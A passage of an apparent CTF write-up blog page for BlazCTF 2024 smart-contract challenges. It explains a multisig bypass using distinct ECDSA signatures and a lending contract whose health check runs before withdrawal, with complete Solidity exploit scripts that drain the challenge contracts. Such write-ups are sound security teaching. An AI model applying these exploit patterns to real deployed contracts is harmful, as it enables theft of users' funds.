+        <span style="color:#66d9ef">while</span> (doju.balanceOf(player) <span style="color:#f92672">&lt;</span> type(<span style="color:#a6e22e">uint256</span>).max <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) {
+            doju.sellTokens(tokenAmount, to, minOut);
+        }
+
+        doju.transfer(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0xc0ffee</span>), doju.balanceOf(player));
+        require(challenge.isSolved(), <span style="color:#e6db74">&#34;not solved&#34;</span>);
+    }
+}
+</code></pre></div><h2 id="cyber-cartel">Cyber Cartel<a href="#cyber-cartel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-2">Challenge Summary<a href="#challenge-summary-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>Malone, Wiz and Box recently robbed a billionaire and deposited their proceeds into a multisig treasury. And who is Box? The genius hacker behind everything. He&rsquo;s gonna rob his friends&hellip;</p>
+<p><a href="https://storage.googleapis.com/blazctf24/cyber-cartel.zip">Handouts</a></p>
+</blockquote>
+<p>We have two contracts in this challenge. <code>BodyGuard</code> is a contract that would call functions from the treasury if we have three signatures from the guardians (two unknown and one being the player). <code>CartelTreasury</code> is a contract that has some functions that are only callable from the <code>bodyGuard</code>. The goal is to drain the ethers from <code>CartelTreasury</code>.</p>
+<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="part-i-getting-multiple-distinct-signatures-with-a-single-signer">Part I: Getting multiple distinct signatures with a single signer<a href="#part-i-getting-multiple-distinct-signatures-with-a-single-signer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The guardian contract will execute an arbitrary call when it is &ldquo;properly signed&rdquo;. There are some functions on the cartel contract that can be called only by the guardian contract.</p>
+<p>There are some conditions for a message considered to be multi-signed:</p>
+<ul>
+<li>there are three signatures collected,</li>
+<li>the signer for each signature must be one of the three approved guardians, and we are one of them, and</li>
+<li>the Keccak256 digests of the signatures must be strictly increasing.</li>
+</ul>
+<p>In short, we need to collect three distinct signatures from any of the signers. It works even if a single signer is able to provide three distinct signatures.</p>
+<p>Modern Ethereum packages use <a href="https://datatracker.ietf.org/doc/html/rfc6979">RFC6979</a> to sign a message with a deterministic nonce, for instance, <code>vm.sign</code> in Foundry would always return the same signature. However, signatures created by any nonce is considered valid. This is simply because we are unable to determine, as a verifier, a nonce is <em>the</em> nonce derived with RFC6979. Thus it is possible for a signer to generate distinct signatures for a given message.</p>
+<p>One little question remain&hellip; What to sign?</p>
+<h4 id="part-ii-draining-the-treasury">Part II: Draining the treasury<a href="#part-ii-draining-the-treasury" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>I immediately tried to call <code>treasury.doom</code> using the guardian contract. However, it would not work because the <code>BodyGuard</code> contract has no payable functions.</p>
+<p>Instead, we need to fire the body guard (i.e., setting <code>bodyGuard = address(0x0)</code>) with <code>treasury.dismiss</code>. We then can call <code>treasury.initialize</code> with a malicious body guard and call <code>treasury.doom</code> to transfer all the ethers afterwards.</p>
+<h3 id="solution-script-2">Solution Script<a href="#solution-script-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">26</span>;
+
+<span style="color:#f92672">import</span> {Script, console} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/Challenge.sol&#34;</span>;
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../src/CyberCartel.sol&#34;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ExploitScript</span> <span style="color:#66d9ef">is</span> Script {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {}
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        Challenge challenge <span style="color:#f92672">=</span> Challenge(<span style="color:#ae81ff">0x2429A189dd3323AaD7Fc9c1E658Dd80c0ab12Fd5</span>);
+        CartelTreasury treasury <span style="color:#f92672">=</span> CartelTreasury(<span style="color:#66d9ef">payable</span>(challenge.TREASURY()));
+        BodyGuard bodyGuard <span style="color:#f92672">=</span> BodyGuard(treasury.bodyGuard());
+
+        vm.startBroadcast();
+
+        require(bodyGuard.guardians(msg.sender), <span style="color:#e6db74">&#34;you are not a guardian&#34;</span>);
+
+        BodyGuard.Proposal <span style="color:#66d9ef">memory</span> proposal;
+        <span style="color:#66d9ef">bytes</span>[] <span style="color:#66d9ef">memory</span> signatures <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">bytes</span>[](<span style="color:#ae81ff">3</span>);
+
+        proposal.expiredAt <span style="color:#f92672">=</span> type(<span style="color:#a6e22e">uint32</span>).max;
+        proposal.gas <span style="color:#f92672">=</span> type(<span style="color:#a6e22e">uint24</span>).max;
+        proposal.nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+        proposal.data <span style="color:#f92672">=</span> abi.encodeWithSelector(treasury.gistCartelDismiss.selector);
+
+        signatures[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> abi.encodePacked(
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">70859077052232689629756310103205080667258477748980774236893770954867402388350</span>),
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">14096269543505290919012195916898044762171069125550658007327168284379109563191</span>),
+            <span style="color:#66d9ef">uint8</span>(<span style="color:#ae81ff">28</span>)
+        );
+        signatures[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> abi.encodePacked(
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">10372245554972896093582123004174987431211603282413396983811888247534900329891</span>),
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">55103822151495814764573943500738618633285412537396818523717665920905458870443</span>),
+            <span style="color:#66d9ef">uint8</span>(<span style="color:#ae81ff">27</span>)
+        );
+        signatures[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> abi.encodePacked(
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">70054947218465115124070121157516745380413483924040567416787163687531118442332</span>),
+            <span style="color:#66d9ef">uint256</span>(<span style="color:#ae81ff">22402771072968988044451507239837167350477193281342038924959667106645423636427</span>),
+            <span style="color:#66d9ef">uint8</span>(<span style="color:#ae81ff">27</span>)
+        );
+        bodyGuard.propose(proposal, signatures);
+
+        ExploitContract exploit <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ExploitContract(treasury);
+        treasury.initialize(<span style="color:#66d9ef">address</span>(exploit));
+        exploit.run();
+
+        require(challenge.isSolved(), <span style="color:#e6db74">&#34;not solved&#34;</span>);
+    }
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ExploitContract</span> {
+    CartelTreasury <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">immutable</span> treasury;
+
+    <span style="color:#66d9ef">constructor</span> (CartelTreasury _treasury) {
+        treasury <span style="color:#f92672">=</span> _treasury;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        treasury.doom();
+    }
+
+    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+}
+</code></pre></div><h2 id="tonylend">Tonylend<a href="#tonylend" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-3">Challenge Summary<a href="#challenge-summary-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>Tony <a href="https://www.youtube.com/watch?v=3BrCvZmSnKA">eats cats and dogs</a>, and builds lending platform that competes with Trump&rsquo;s cryptocurrency.</p>
+<p><a href="https://storage.googleapis.com/blazctf24/tony-lend.zip">Handouts</a></p>
+</blockquote>
+<p>There is a <code>TonyLend</code> contracts that somehow acts as a bank, which us to <code>deposit</code>, <code>withdraw</code>, <code>borrow</code>, <code>repay</code> and <code>liquidite</code>. For most of the operations, there is a check on the health score to avoid under-collateralization. There is also a <a href="https://resources.curve.fi/">curve pool</a> that trades wUSDe and wUSDC. Initially the user has 10000 wUSDe and 10000 wUSDc at the initial price of 1:1, and the goal is to obtain at least 21926 wUSDe.</p>
+<h3 id="solution-3">Solution<a href="#solution-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The <code>TonyLend::calculateHealthFactor</code> function that checks, in short, if we have less &ldquo;borrows&rdquo; than &ldquo;deposits&rdquo;. For instance, if the tokens I deposited and borrowed have respectively 3 ETH and 2 ETH in values, then the health score would be 1.5. In that case, we are said to be financially healthy in their contract. This value is checked in multiple functions like <code>TonyLend::borrow</code> and <code>TonyLend::withdraw</code>.</p>
+<p>The health factor should be performed at the end to ensure the ending balances are healthy. However, <code>TonyLend::withdraw</code> is checking the health factor before the values are changed, which made people able to withdraw more tokens than expected. For instance, a user has 1 ETH deposited and 1 ETH borrowed, we should be unable to withdraw 1 ETH because it would end up at a health score 0. However, we can withdraw from the contract because the health score is 1 at the beginning.</p>
+<p>Starting with 1 ETH, we can deposit it to the contract. We then can borrow 1 ETH and withdraw all the funds. We end up having 2 ETH. Our account in the contract needs to be liquidified, but we no longer need to deal with the contract anymore.</p>
+<div style="text-align: center;">
+  <div class="graphviz">
+  digraph structs {
+    rankdir=LR
+<pre><code>node [color=&quot;#ffe4e1&quot;, fontcolor=&quot;#ffe4e1&quot;, fillcolor=&quot;#33333c&quot;, style=&quot;filled&quot;, shape=&quot;record&quot;]
+graph [bgcolor=&quot;transparent&quot;]
+edge [color=&quot;#ffe4e1&quot;, fontcolor=&quot;#ffe4e1&quot;]
+
+state1 [label=&quot;{{User Balance: 1 ETH|Deposited: 0 ETH\nBorrowed 0 ETH}}&quot;]
+state2 [label=&quot;{{User Balance: 0 ETH|Deposited: 1 ETH\nBorrowed 0 ETH}}&quot;]
+state3 [label=&quot;{{User Balance: 1 ETH|Deposited: 1 ETH\nBorrowed 1 ETH}}&quot;]
+state4 [
+    label=&quot;{{User Balance: 2 ETH|Deposited: 0 ETH\nBorrowed 1 ETH}}&quot;,
+    color=&quot;#ff5451&quot;, fontcolor=&quot;#ff5451&quot;
+]
+
+state1 -&gt; state2[label=&quot;Deposit 1 ETH&quot;]
+state2 -&gt; state3[constraint=false, label=&quot;Borrow 1 ETH&quot;]
+state3 -&gt; state4[label=&quot;Withdraw 1 ETH&quot;, color=&quot;#ff5451&quot;, fontcolor=&quot;#ff5451&quot;]
+</code></pre>
+<p>}</p>
+  </div>
+</div>    
+<div class="alert success">
+  🧀 <strong>Cheesed!</strong> The challenge authors later released a revenge called <em>Tonylend (No Longer Audited by CertiK)</em> to address the unintended solution. I wasn&rsquo;t able to solve without the cheese.
+</div>
+
+<h3 id="solution-script-3">Solution Script<a href="#solution-script-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">13</span>;
+
+<span style="color:#f92672">import</span> {Script, console} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span>;
+<span style="color:#f92672">import</span> {Challenge} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;../src/Challenge.sol&#34;</span>;
+<span style="color:#f92672">import</span> {TonyLend} <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#34;../src/TonyLend2.sol&#34;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ExploitScript</span> <span style="color:#66d9ef">is</span> Script {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setUp</span>() <span style="color:#66d9ef">public</span> {}
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
+        Challenge challenge <span style="color:#f92672">=</span> Challenge(<span style="color:#ae81ff">0x72998f0cffFe9Bf0fC7465188aCF3c5a8C77B616</span>);
+        TonyLend tonyLend <span style="color:#f92672">=</span> challenge.tonyLend();
+        IERC20 usdc <span style="color:#f92672">=</span> challenge.usdc();
+        IERC20 usde <span style="color:#f92672">=</span> challenge.usde();
+
+        vm.startBroadcast();
+
+        usde.approve(<span style="color:#66d9ef">address</span>(tonyLend), type(<span style="color:#a6e22e">uint256</span>).max);
+        usdc.approve(<span style="color:#66d9ef">address</span>(tonyLend), type(<span style="color:#a6e22e">uint256</span>).max);
+
+        challenge.claimDust();
+
+        tonyLend.deposit(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>e4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>e18);
+        tonyLend.deposit(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>e4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>e6);
+
+        tonyLend.borrow(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>.<span style="color:#ae81ff">2</span>e4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>e18);
+
+        tonyLend.withdraw(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>e4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>e18);
+
+        usde.transfer(<span style="color:#66d9ef">address</span>(<span style="color:#ae81ff">0xc0ffee</span>), <span style="color:#ae81ff">2</span>.<span style="color:#ae81ff">2</span>e4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>e18);
+        require(challenge.isSolved(), <span style="color:#e6db74">&#34;not solved&#34;</span>);
+    }
+}
+</code></pre></div>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://mystiz.hk/posts/2024/2024-07-20-hitcon-ctf/">
+                <span class="button__text">HITCON CTF 2024 Writeup</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    BlazCTF 2024 Writeup
+  </a>
+  <div class="js-toc"></div>
+</aside>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      headingSelector: 'h1, h2, h3, h4',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+</script>
+
+
+
+  </div>
+  <aside class="ads">
+    
+  
+  <ins class="adsbygoogle"
+    style="display:block"
+    data-ad-client="ca-pub-3220069814773012"
+    data-ad-slot="6927401005"
+    data-ad-format="auto"
+    data-full-width-responsive="true"></ins>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+
+
+  </aside>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://mystiz.hk/assets/main.js"></script>
+<script src="https://mystiz.hk/assets/prism.js"></script>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/viz.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/full.render.js"></script>
+<script>
+var viz = new Viz();
+
+document.querySelectorAll("[class=graphviz]").forEach(node => {
+  const escape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+  viz.renderSVGElement(escape(node.innerText), {
+    engine: 'dot'
+  }).then(function (element) {
+    node.parentNode.appendChild(element)
+    node.style.display = 'none'
+  })
+})
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+    startOnLoad: true,
+    htmlLabels: true,
+    securityLevel: "loose",
+    theme: 'base',
+    themeVariables: {
+        background: '#22222c',
+        primaryColor: '#33333c',
+        primaryTextColor: '#ffe4e1',
+    }
+});
+</script>
+<link href="https://cdn.jsdelivr.net/npm/js-sequence-diagram@2.0.1/dist/sequence-diagram-min.min.css" rel="stylesheet" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/snapsvg@0.5.1/dist/snap.svg-min.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/underscore@1.13.6/underscore-min.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/js-sequence-diagram@2.0.1/dist/sequence-diagram.min.js" crossorigin="anonymous"
+  onload="
+    Array.from(document.getElementsByClassName('sequence-diagram')).forEach(dom => {
+      const content = new DOMParser().parseFromString(dom.innerHTML, 'text/html').documentElement.textContent;
+      dom.innerHTML = '';
+      Diagram.parse(content).drawSVG(dom, {
+        theme: 'simple',
+        'font-family': 'Fira Code'
+      })
+    })"></script>
+
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2VLBDVW913"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2VLBDVW913');
+</script>
+
+
+
+
+  
+</div>
+
+</body>
+</html>
